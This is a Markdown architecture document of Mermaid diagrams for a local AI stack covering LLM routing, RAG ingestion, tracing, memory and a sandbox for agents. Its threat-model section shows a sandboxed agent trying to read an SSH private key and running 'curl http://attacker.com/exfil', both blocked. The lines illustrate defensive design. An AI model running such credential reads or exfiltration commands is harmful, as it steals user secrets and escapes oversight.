# Diagrams

System-level architecture diagrams for `~/ai-stack`. Mermaid renders
natively in GitHub and most editors.

> **Tip — if your editor's preview pane renders these too small to read** (text
> shrinks, boxes pack in, zoom only enlarges proportionally instead of
> letting you pan): open **[DIAGRAMS.html](DIAGRAMS.html)** instead. It's
> a single-file companion that renders the same diagrams via mermaid v11
> (much sharper than the older mermaid 9.x most preview tools embed),
> gives each diagram a per-card zoom + pan + full-screen button, and has
> a sticky table of contents on the left. Open it directly in any
> browser: `open ~/ai-stack/DIAGRAMS.html`.

This document is the visual companion to [STACK-GUIDE.md](STACK-GUIDE.md)
(what each service does) and [ALTERNATIVES.md](ALTERNATIVES.md) (what
else you could use). Read those for prose; read this for shape.

> **Footnote on labels.** Boxes use alias names (e.g., `litellm`,
> `phoenix`). All edges — Mac-side and container-to-container — use the
> alias plus native port: `http://litellm:4000`, `http://phoenix:6006`,
> `http://openwebui:8080`. Ollama is the one host-gateway exception —
> its port `:11434` is just its native listener port, same as the
> others. (The 2026-05-27 design originally dropped the port on
> Mac-side dials but the OrbStack `*:80` wildcard listener forced us to
> native ports; see [CHANGELOG.md 2026-05-28 entry](../CHANGELOG.md).)

---

## 1. System overview — what talks to what

The 10,000-foot view. Boxes are services, arrows are "calls" (not
necessarily bidirectional traffic — most return values flow back along
the same edge).

```mermaid
flowchart LR
  You((You))

  subgraph UIs[UIs]
    OWU[openwebui :8080]
    HW[workspace :3000]
    PC[paperclip :3100]
    CLI["Terminal / CLI"]
  end

  subgraph Agents[Agents]
    HF["hermes-fleet-v1 (sandbox)"]
    AF[autofyn :3400]
    DF[DeerFlow]
  end

  subgraph Infer[Inference]
    LL[litellm :4000]
    OL[ollama :11434]
    CLOUD[(Cloud APIs)]
  end

  subgraph Storage[Storage and Memory]
    HO[honcho :8000]
    QD[qdrant :6333]
    FK[falkordb :6379]
  end

  subgraph Docs[Documents]
    DC[Docling]
    LI[LlamaIndex]
    MCP[docs-mcp :8765]
  end

  subgraph Obs[Observability and Security]
    PX[phoenix :6006]
    LG[llm-guard :8000]
    GR[Built-in guardrails]
  end

  You --> UIs
  You --> CLI

  OWU --> LL
  HW --> HF
  PC --> Agents
  CLI --> Agents

  HF --> LL
  AF --> LL
  DF --> LL
  HF --> HO
  HF --> MCP

  LL --> OL
  LL --> CLOUD
  LL --> PX
  LL --> GR

  Docs --> QD
  MCP --> QD
  DC --> LI
  LI --> Docs

  Agents -.optional.-> LG
```

Key things to notice:
- Every LLM call funnels through LiteLLM.
- Phoenix only receives; it never sits in the request path.
- Honcho and Qdrant are the long-term state. Everything else is
  ephemeral.

---

## 2. Layer / boundary diagram

The same services grouped by responsibility. Useful when you want to
talk about, say, "the security layer" without listing four containers
by name.

```mermaid
flowchart TB
  subgraph L1[Presentation layer]
    direction LR
    OWU[openwebui :8080]
    HW[workspace :3000]
    PC[paperclip :3100]
    Term[Terminal]
  end

  subgraph L2[Agent layer]
    direction LR
    HF["Hermes profiles (sandbox)"]
    AF[autofyn :3400]
    DF[DeerFlow]
  end

  subgraph L3[Inference layer]
    direction LR
    LL[litellm :4000]
    OL[ollama :11434]
    EXT["Anthropic / OpenAI / OpenRouter / Gemini"]
  end

  subgraph L4[Memory and storage layer]
    direction LR
    HO[honcho :8000]
    QD[qdrant :6333]
    FK[falkordb :6379]
  end

  subgraph L5[Document layer]
    direction LR
    DC[Docling]
    LI[LlamaIndex]
    MCP[docs-mcp :8765]
  end

  subgraph L6[Observability layer]
    direction LR
    PX[phoenix :6006]
    Trace["traces/*.jsonl"]
    HALO["halo (CLI)"]
  end

  subgraph L7[Security layer]
    direction LR
    OS["hermes-fleet-v1 (sandbox)"]
    GB[Built-in guardrails]
    LG[llm-guard :8000]
    Dual[Dual-LLM pattern]
  end

  subgraph L8[Platform layer]
    direction LR
    OB[OrbStack]
    Brew[brew services]
    Env[.env mode 0600]
  end

  L1 --> L2
  L1 --> L3
  L2 --> L3
  L2 --> L4
  L2 --> L5
  L3 --> L6
  L2 -.runs in.-> L7
  L3 -.runs on.-> L8
  L4 -.runs on.-> L8
  L6 -.runs on.-> L8
```

The boundary that matters most is **L7 wraps L2**. Every agent runs
inside the OpenShell sandbox; the rest of the stack does not.

---

## 3. User story: chatting with a model via Open WebUI

The simplest path through the stack. You type, you get an answer back.

```mermaid
  %%{init: { "theme": "default", "themeVariables": {"fontSize": "16px"}, "sequence": {"actorMargin": 80, "messageMargin": 40, "wrap": true} }}%%
sequenceDiagram
  autonumber
  participant U as You
  participant W as openwebui :8080
  participant L as litellm :4000
  participant M as Model (Ollama or Claude or ...)
  participant P as phoenix :6006
  participant G as Guardrails

  U->>W: "summarize this article" + paste
  W->>L: POST /v1/chat/completions (model=claude-sonnet)
  L->>G: pre-call deny check
  G-->>L: ok
  L->>M: forward request
  M-->>L: streamed tokens
  L->>G: post-call redact check
  G-->>L: no secrets, pass through
  L-->>W: SSE stream
  W-->>U: rendered response
  L->>P: OTLP trace (async)
  L->>L: append to traces/litellm.jsonl
```

The guardrail checks are roughly 1 ms each — invisible to the user.
The trace ship to Phoenix is fully async; if Phoenix is down, the
response still arrives, you just lose the trace.

---

## 4. User story: Hermes researcher answers a question using local + cloud

The interesting path — combining local and cloud models, querying
internal docs, and running inside the OpenShell sandbox.

```mermaid
  %%{init: { "theme": "default", "themeVariables": {"fontSize": "16px"}, "sequence": {"actorMargin": 80, "messageMargin": 40, "wrap": true} }}%%
sequenceDiagram
  autonumber
  participant U as You
  participant CoS as hermes_cos (sandbox)
  participant R as hermes_researcher (sandbox)
  participant SBX as hermes-gw :8642
  participant L as litellm :4000
  participant LH as Local heavy (Qwen 27B)
  participant CL as Claude Opus
  participant MCP as docs-mcp :8765
  participant Q as qdrant :6333
  participant HO as honcho :8000

  U->>CoS: "Compare graph RAG vs vector RAG for our docs"
  CoS->>R: delegate research task
  R->>HO: "what do I know about previous RAG decisions?"
  HO-->>R: derived facts about the user's prior context
  R->>MCP: search_documents("graph vs vector RAG")
  MCP->>Q: vector similarity (top_k=5)
  Q-->>MCP: 5 chunks
  MCP-->>R: chunks with sources

  Note over R,SBX: All outbound calls go via inference.local
  R->>SBX: chat completion (model=local-heavy)
  SBX->>L: forward
  L->>LH: forward
  LH-->>L: summary of chunks
  L-->>SBX: response
  SBX-->>R: response

  R->>SBX: chat completion (model=claude-opus, "synthesize")
  SBX->>L: forward
  L->>CL: forward
  CL-->>L: structured comparison
  L-->>SBX: response
  SBX-->>R: response

  R->>HO: store conclusions for future sessions
  R-->>CoS: final report with citations
  CoS-->>U: report
```

Three things this shows:
- The researcher uses **local-heavy** for cheap summarization and
  **claude-opus** for the high-stakes synthesis. Mixed cost discipline.
- Every external call goes via `inference.local`, the OpenShell L7
  proxy. The agent never sees a real API key.
- The researcher both reads and writes Honcho, so a follow-up question
  next week starts with the conclusions from today.

---

## 5. User story: ingesting a new PDF into RAG

You drop a file in `ingestor/inbox/`. Eventually agents can search it.

```mermaid
  %%{init: { "theme": "default", "themeVariables": {"fontSize": "16px"}, "sequence": {"actorMargin": 80, "messageMargin": 40, "wrap": true} }}%%
sequenceDiagram
  autonumber
  participant U as You
  participant FS as ingestor/inbox/
  participant ING as docs-ingestor (bg)
  participant DC as Docling
  participant LI as LlamaIndex
  participant L as litellm :4000
  participant E as embed-openai-small
  participant Q as qdrant :6333
  participant DONE as ingestor/processed/

  U->>FS: cp paper.pdf ingestor/inbox/
  U->>ING: python ingest.py (manual run)
  ING->>FS: list files
  loop per file
    ING->>DC: convert(paper.pdf)
    DC-->>ING: structured doc + markdown export
    ING->>LI: build Document, store via VectorStoreIndex
    LI->>L: POST /v1/embeddings (per chunk)
    L->>E: forward
    E-->>L: 1536-dim vector
    L-->>LI: vector
    LI->>Q: upsert points
    Q-->>LI: ok
    ING->>DONE: move paper.pdf
  end
  ING-->>U: "N docs ingested"
```

After this, `mcp_server.py` can serve `search_documents` queries
against the new chunks immediately — the MCP server opens the same
Qdrant collection.

---

## 6. User story: an agent runs a shell command (sandbox in action)

The path that justifies OpenShell's existence. The agent wants to `pip
install something`. We let it install from pypi but not write to
`~/.ssh/`.

This is the threat model. The agent does not need to be trustworthy
because the sandbox is not. Five distinct scenarios — one per diagram so
each stays legible.

**6.1 Allowed write inside the sandbox.**

```mermaid
%%{init: { "theme": "default", "themeVariables": {"fontSize": "16px"}, "sequence": {"actorMargin": 80, "messageMargin": 40, "wrap": true} }}%%
sequenceDiagram
  autonumber
  participant A as Agent inside sandbox
  participant FS as Sandbox FS
  A->>FS: write /sandbox/tmp/foo.py
  FS-->>A: ok (path in allow list)
```

**6.2 Denied read of host secrets.** The agent asks for an SSH key; the
FS layer checks with the policy engine and refuses.

```mermaid
%%{init: { "theme": "default", "themeVariables": {"fontSize": "16px"}, "sequence": {"actorMargin": 80, "messageMargin": 40, "wrap": true} }}%%
sequenceDiagram
  autonumber
  participant A as Agent inside sandbox
  participant FS as Sandbox FS
  participant POL as Policy engine
  A->>FS: read /Users/mayssam/.ssh/id_rsa
  FS->>POL: check
  POL-->>FS: DENY (path outside sandbox roots)
  FS-->>A: permission denied
```

**6.3 Allowed network egress to an allowlisted host.** `pip install
requests` goes to pypi.org via the L4 firewall and L7 proxy.

```mermaid
%%{init: { "theme": "default", "themeVariables": {"fontSize": "16px"}, "sequence": {"actorMargin": 80, "messageMargin": 40, "wrap": true} }}%%
sequenceDiagram
  autonumber
  participant A as Agent inside sandbox
  participant POL as Policy engine
  participant NET as Sandbox L4 firewall
  participant PROXY as Sandbox L7 proxy
  participant EXT as Internet
  A->>NET: pip install requests
  NET->>POL: check destination
  POL-->>NET: ALLOW pypi.org
  NET->>PROXY: forward
  PROXY->>EXT: TLS to pypi
  EXT-->>PROXY: package
  PROXY-->>NET: bytes
  NET-->>A: install done
```

**6.4 Denied network egress to a non-allowlisted host.** The agent tries
to exfil to `attacker.com`; the L4 firewall rejects.

```mermaid
%%{init: { "theme": "default", "themeVariables": {"fontSize": "16px"}, "sequence": {"actorMargin": 80, "messageMargin": 40, "wrap": true} }}%%
sequenceDiagram
  autonumber
  participant A as Agent inside sandbox
  participant POL as Policy engine
  participant NET as Sandbox L4 firewall
  A->>NET: curl http://attacker.com/exfil
  NET->>POL: check destination
  POL-->>NET: DENY (not in allow list)
  NET-->>A: connection refused
```

**6.5 Inference call through `inference.local`.** The agent dials the
sandbox-internal endpoint; the L7 proxy rewrites to `litellm:4000` on the
ai-stack network and injects the real bearer token server-side. The
agent never sees the master key.

```mermaid
%%{init: { "theme": "default", "themeVariables": {"fontSize": "16px"}, "sequence": {"actorMargin": 80, "messageMargin": 40, "wrap": true} }}%%
sequenceDiagram
  autonumber
  participant A as Agent inside sandbox
  participant PROXY as Sandbox L7 proxy
  participant LL as litellm :4000
  A->>PROXY: POST inference.local/v1/chat/completions
  PROXY->>LL: rewrite + inject Bearer (ai-stack network)
  LL-->>PROXY: response
  PROXY-->>A: response (real API key never seen)
```

---

## 7. Security and sandbox boundaries

A different view of the same story — who can talk to whom, drawn as
trust boundaries instead of as a sequence.

```mermaid
flowchart TB
  subgraph Internet[Open internet]
    PyPI[pypi.org]
    GH[github.com]
    NPM[registry.npmjs.org]
    Claude[anthropic.com]
    Bad[attacker.com]
  end

  subgraph Host[macOS host - trusted]
    OL[ollama :11434]
    Env[.env mode 0600]
    Keys[(SSH keys, browser data)]
    Brew[brew services]
  end

  subgraph Containers[ai-stack bridge network - semi-trusted]
    LL[litellm :4000]
    PX[phoenix :6006]
    HO[honcho :8000 + postgres]
    QD[qdrant :6333]
    FK[falkordb :6379]
    OWU[openwebui :8080]
    LG[llm-guard :8000]
  end

  subgraph Sandbox[OpenShell sandbox - untrusted]
    HF["hermes-fleet-v1 (sandbox)"]
  end

  Sandbox -- inference.local --> SBProxy[hermes-gw :8642]
  SBProxy --> LL

  Sandbox -- allowlisted --> PyPI
  Sandbox -- allowlisted --> GH
  Sandbox -- allowlisted --> NPM
  Sandbox -.denied.-> Bad

  LL -- master key in .env --> Claude
  LL --> OL

  Containers -- 127.0.10.x only --> Host
  Containers -.cannot reach.-> Keys
  Sandbox -.cannot reach.-> Keys
  Sandbox -.cannot reach.-> Env
```

Trust tiers:
1. **Host** — full trust. Has your SSH keys, browser data, `.env`.
2. **Containers** — semi-trusted. Bound to `127.0.10.x` loopback only, so
   nothing on your network can reach them. They hold service state but no
   personal data. Inter-container traffic stays on the `ai-stack` bridge.
3. **Sandbox** — untrusted. Network deny-by-default. Filesystem locked
   to `/sandbox/` and `/tmp/`. API keys substituted by the L7 proxy.

The arrows that **don't exist** matter as much as the ones that do.

---

## 8. Where your data goes (privacy story)

The most important diagram for anyone deciding whether to use this
stack. Color and direction tell you what stays on your machine and what
leaves it.

```mermaid
flowchart LR
  You((You))

  subgraph Local[Your MacBook — stays here]
    OWU[openwebui :8080]
    LL[litellm :4000]
    OL[ollama :11434]
    HO[honcho :8000]
    QD[qdrant :6333]
    FK[falkordb :6379]
    PX[phoenix :6006]
    HF["Hermes profiles (sandbox)"]
    Traces["traces/*.jsonl"]
    Docs["ingestor/*"]
  end

  subgraph Cloud[Optional — leaves your machine]
    Anth[Anthropic]
    OAI[OpenAI]
    OR[OpenRouter]
    Gem[Gemini]
    Blax["blaxel_cli (CLI)"]
  end

  You --> OWU
  You --> HF

  OWU --> LL
  HF --> LL

  LL -. when you pick a local model .-> OL
  LL -. when you pick a cloud model .-> Anth
  LL -. when you pick a cloud model .-> OAI
  LL -. when you pick a cloud model .-> OR
  LL -. when you pick a cloud model .-> Gem

  Local -. only if you run bl deploy .-> Blax

  classDef local fill:#dff,stroke:#066;
  classDef cloud fill:#fdd,stroke:#600;
  class Local local
  class Cloud cloud
```

The rules:
- **Your prompts** only leave the machine if you pick a cloud model
  (anything not named `local` or `local-heavy`).
- **Your documents** never leave the machine. Docling parses locally;
  embeddings are computed via LiteLLM. If you pick `embed-local` (Ollama
  nomic-embed) instead of `embed-openai-small`, even the embeddings
  stay local.
- **Your memory (Honcho)** never leaves the machine. The derivations
  run via LiteLLM, so if Honcho calls a cloud model, the message
  content is sent to that model — but the derived facts stay in your
  Postgres.
- **Traces** are written to `traces/` on disk and into Phoenix's local
  SQLite. Neither sink is internet-connected.
- **Blaxel** is the only piece that is cloud-by-design. The CLI is
  installed but nothing deploys until you run `bl deploy`.

If you want fully air-gapped operation: use the `paranoid` profile
(`stack profile paranoid`), set every model to `local` / `local-heavy`,
disable cloud API keys in `.env`.

---

## 9. Per-call observability: where a trace lives

Every LiteLLM call produces traces in three places. This helps when
you want to figure out where to look for what.

```mermaid
flowchart LR
  Call[Single chat completion] --> LL[litellm :4000]
  LL --> Cb1[trace_to_file.handler]
  LL --> Cb2[arize_phoenix]
  LL --> Cb3[guardrails.handler]

  Cb1 --> JSONL[traces/litellm.jsonl]
  Cb2 -- "http://phoenix:6006/v1/traces (OTLP HTTP)" --> Phoenix[phoenix :6006 SQLite + UI]
  Cb3 --> Audit[traces/guardrails.jsonl]

  Phoenix -.read by.-> HALO["halo (CLI)"]
  Audit -.read by.-> Audit_sh[bin/audit.sh]
  Phoenix -.read by.-> Browser[Browser UI]
```

So:
- **What broke this morning?** → Phoenix UI.
- **Why did this prompt get blocked?** → grep `traces/guardrails.jsonl`.
- **What patterns are failing across 1000 runs?** → `halo` over the
  OTel traces in Phoenix (it reads OTel-format spans, not
  `traces/litellm.jsonl`).
- **Hot debugging right now?** → `tail -f traces/litellm.jsonl`.

---

## 10. Memory profiles — what runs in each mode

`stack profile <name>` flips a curated set of services on or off.
This diagram shows the four built-in profiles side by side.

```mermaid
flowchart LR
  subgraph F[fleet — default research+chat]
    F1[ollama :11434] & F2[litellm :4000] & F3[phoenix :6006] & F4[falkordb :6379]
    F5[qdrant :6333] & F6[honcho :8000] & F7[openshell] & F8["hermes-fleet-v1 (sandbox)"]
    F9[openwebui :8080] & F10[workspace :3000] & F11[dual-llm]
  end
  subgraph C[coding — minimal for code work]
    C1[ollama :11434] & C2[litellm :4000] & C3[phoenix :6006] & C4[openshell]
    C5[autofyn :3400]
  end
  subgraph R[research — docs + agents, no chat UI]
    R1[ollama :11434] & R2[litellm :4000] & R3[phoenix :6006] & R4[qdrant :6333]
    R5[openshell] & R6["docs-ingestor (bg)"] & R7[docs-mcp :8765] & R8[deerflow]
    R9[dual-llm]
  end
  subgraph P[paranoid — air-gap-ish]
    P1[ollama :11434] & P2[litellm :4000] & P3[llm-guard :8000]
    P4[openshell] & P5[dual-llm]
  end
```

The profiles disagree only on the top tier. The inference plane
(LiteLLM + Ollama) is in every profile because nothing works without
it.

---

## 11. Network topology — host vs ai-stack vs OpenShell

Three distinct networks; the bridge points are where the interesting
traffic crosses.

```mermaid
flowchart TB
  subgraph Mac[macOS host - 127.0.10.x via /etc/hosts]
    direction TB
    Shell["Mac shell / browser"]
    OL[ollama :11434]
    DocsM[docs-mcp :8765]
    DocsI["docs-ingestor (bg)"]
    Etc[/etc/hosts managed block/]
  end

  subgraph AS[ai-stack docker bridge 10.99.0.0/24]
    direction TB
    LL[litellm :4000]
    PX[phoenix :6006]
    QD[qdrant :6333]
    FK[falkordb :6379]
    OWU[openwebui :8080]
    LG[llm-guard :8000]
    HA[honcho :8000]
    HD["honcho-deriver (internal)"]
  end

  subgraph HONCHO[honcho_default - compose internal]
    direction TB
    HA2[honcho-api also here]
    HDB[honcho-database]
    HRE[honcho-redis]
    HD2[honcho-deriver also here]
  end

  subgraph SBX[OpenShell sandbox - own egress policy]
    direction TB
    HF["hermes-fleet-v1 (sandbox)"]
    GW[hermes-gw :8642]
  end

  Shell -- dial alias via /etc/hosts --> LL
  Shell -- dial alias via /etc/hosts --> PX
  Shell -- dial alias via /etc/hosts --> QD
  Etc -. resolves 127.0.10.x .-> LL

  LL -- "ollama:11434 via host-gateway" --> OL
  LL -- "http://phoenix:6006 via docker DNS" --> PX
  HA -- "litellm.ai-stack:4000 fully-qualified" --> LL

  HA --- HA2
  HD --- HD2

  HF -- inference.local --> GW
  GW -- "policy-allowed, host-gateway path" --> LL
  HF -. "honcho:8000 allowed" .-> HA

  DocsM -- "http://litellm:4000 via /etc/hosts" --> LL
  DocsM -- "http://qdrant:6333 via /etc/hosts" --> QD
```

Reading it:
- **Bridge point #1**: `/etc/hosts` block on the Mac — gives the Mac
  shell, browser, and host-side Python processes name-resolution into
  the `127.0.10.x` range. Phase 00·N owns this.
- **Bridge point #2**: the `ai-stack` Docker network — every managed
  container joins it; Docker's embedded DNS handles intra-network bare
  names.
- **Bridge point #3**: `--add-host=ollama:host-gateway` on each Ollama
  consumer — the single allowed container-to-host alias. Port `:11434`
  stays in the URL.
- **Multi-network containers** (honcho-api, honcho-deriver) sit on both
  `ai-stack` and `honcho_default`. Cross-network calls use
  fully-qualified `<service>.<network>` to avoid bare-name ambiguity.
- **Sandbox does not join `ai-stack`.** Its egress is policy-controlled
  (deny by default); it reaches `litellm` only via the `hermes-gw` L7
  proxy.
